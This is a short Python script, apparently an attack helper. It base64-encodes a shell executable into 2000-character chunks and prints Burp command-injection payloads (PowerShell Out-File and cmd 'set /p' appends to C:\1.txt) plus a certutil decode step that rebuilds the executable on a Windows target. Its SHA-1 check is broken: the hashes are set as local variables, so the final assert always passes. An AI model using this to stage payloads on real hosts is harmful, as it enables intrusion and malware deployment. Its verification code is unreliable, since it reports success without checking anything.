import base64,hashlib
origin_sha1,now_sha1 = None, None

def get_sha1(text):
    return hashlib.sha1(text).hexdigest()

def split_base64_into_block(ShellName='shell.exe',OutputFileName='gen.txt'):
    with open(ShellName,"rb") as f:
        tmp = f.read()
        origin_sha1 = get_sha1(tmp)
        print("[INFO] origin file sha1 =",origin_sha1)
        s = base64.b64encode(tmp).decode('utf-8')
    segment_base64 = []
    block = 2000
    nums = len(s)//block + 1 if len(s)% block else len(s)//block
    for i in range(nums):
        segment = s[i*block:i*block+block]
        segment_base64.append(segment)

    with open(OutputFileName,'w') as f:
	    f.write('\n'.join(segment_base64))

def check():
    print('[INFO] start to check....')
    with open('gen.txt','r') as f:
        now = f.read().replace('\n','')
        now_sha1 = get_sha1(base64.b64decode(now))
        print("[INFO] now file sha1 =",now_sha1)

if __name__ == "__main__":
    split_base64_into_block('shell1.exe')
    check()
    assert(now_sha1 == origin_sha1)    
    print('[ok] check success')
    print(r"""[INFO] burp execute command `powershell -c "'§§' | Out-File C:\1.txt -Append"` """)
    print(r"""[INFO] burp execute command `cmd /c ">> C:\1.txt set /p=§§ <nul"` """)
    print('[INFO] use `certutil -decode gen.txt 1.exe`')

